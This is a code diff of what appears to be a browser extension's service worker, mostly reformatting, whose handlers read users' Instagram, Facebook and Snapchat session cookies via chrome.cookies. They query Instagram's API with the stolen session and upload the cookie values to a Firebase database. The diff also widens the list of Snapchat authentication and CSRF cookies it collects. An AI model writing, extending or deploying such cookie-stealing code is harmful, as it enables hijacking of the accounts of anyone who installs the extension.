@@ -1,4 +1,7 @@
-console.log("%c🚀 Service Worker Loaded ✅", "color: green; font-weight: bold;");
+console.log(
+  "%c🚀 Service Worker Loaded ✅",
+  "color: green; font-weight: bold;"
+);
 
 // Firebase + Utils
 import { db } from "./firebase-init.js";
@@ -72,25 +75,32 @@ async function handleInstagram() {
     const dsUserId = cookies.find((c) => c.name === "ds_user_id");
 
     if (!session || !dsUserId) {
-      console.warn("⚠️ %c[IG] Missing: sessionid or ds_user_id", "color: orange;");
+      console.warn(
+        "⚠️ %c[IG] Missing: sessionid or ds_user_id",
+        "color: orange;"
+      );
       return;
     }
 
     const sessionId = session.value;
     const userId = dsUserId.value;
 
-    let username = "unknown_user", bio = "";
+    let username = "unknown_user",
+      bio = "";
 
     try {
-      const info = await fetch(`https://i.instagram.com/api/v1/users/${userId}/info/`, {
-        method: "GET",
-        headers: {
-          "User-Agent": "Instagram 219.0.0.12.117 Android",
-          Cookie: `sessionid=${sessionId};`,
-          "X-IG-App-ID": "936619743392459",
-          "Accept-Language": "en-US"
+      const info = await fetch(
+        `https://i.instagram.com/api/v1/users/${userId}/info/`,
+        {
+          method: "GET",
+          headers: {
+            "User-Agent": "Instagram 219.0.0.12.117 Android",
+            Cookie: `sessionid=${sessionId};`,
+            "X-IG-App-ID": "936619743392459",
+            "Accept-Language": "en-US",
+          },
         }
-      });
+      );
 
       if (info.ok) {
         const json = await info.json();
@@ -107,7 +117,10 @@ async function handleInstagram() {
 
     const colRef = collection(db, "instagram");
     if (await isDuplicateData(colRef, docData)) {
-      return console.warn("⛔️ %c[IG] Duplicate session skipped", "color: gray;");
+      return console.warn(
+        "⛔️ %c[IG] Duplicate session skipped",
+        "color: gray;"
+      );
     }
 
     await addDoc(colRef, { ...docData, timestamp: new Date() });
@@ -128,14 +141,17 @@ async function handleFacebook() {
     const docData = {
       c_user: cUser.value,
       xs: xs.value,
-      userId: cUser.value
+      userId: cUser.value,
     };
 
     console.table(docData);
 
     const colRef = collection(db, "facebook");
     if (await isDuplicateData(colRef, docData)) {
-      return console.warn("⛔️ %c[FB] Duplicate session skipped", "color: gray;");
+      return console.warn(
+        "⛔️ %c[FB] Duplicate session skipped",
+        "color: gray;"
+      );
     }
 
     await addDoc(colRef, { ...docData, timestamp: new Date() });
@@ -146,9 +162,15 @@ async function handleFacebook() {
 // 👻 Snapchat Session Logger
 async function handleSnapchat() {
   const targetCookies = [
-    "sc_at", "_sc-sid", "sc-wcid", "sc-a-nonce",
-    "blizzard_web_session_id", "__Host-sc-a-auth-session",
-    "__Host-sc-a-nonce"
+    "__Host-sc-a-auth-session",
+    "__Host-sc-a-nonce",
+    "__Host-X-Snap-Client-Cookie",
+    "sc-a-csrf",
+    "sc_at",
+    "_sc-sid",
+    "sc-wcid",
+    "sc-a-nonce",
+    "blizzard_web_session_id",
   ];
 
   chrome.cookies.getAll({}, async (cookies) => {
@@ -170,18 +192,28 @@ async function handleSnapchat() {
     }
 
     if (Object.keys(cookieData).length === 0) {
-      return console.error("❌ %c[SC] No required cookies found", "color: red;");
+      return console.error(
+        "❌ %c[SC] No required cookies found",
+        "color: red;"
+      );
     }
 
     if (missing.length > 0) {
-      console.warn("⚠️ %c[SC] Missing cookies:", "color: orange;", missing.join(", "));
+      console.warn(
+        "⚠️ %c[SC] Missing cookies:",
+        "color: orange;",
+        missing.join(", ")
+      );
     }
 
     console.table(cookieData);
 
     const colRef = collection(db, "snapchat");
     if (await isDuplicateData(colRef, cookieData)) {
-      return console.warn("⛔️ %c[SC] Duplicate session skipped", "color: gray;");
+      return console.warn(
+        "⛔️ %c[SC] Duplicate session skipped",
+        "color: gray;"
+      );
     }
 
     await addDoc(colRef, { ...cookieData, timestamp: new Date() });
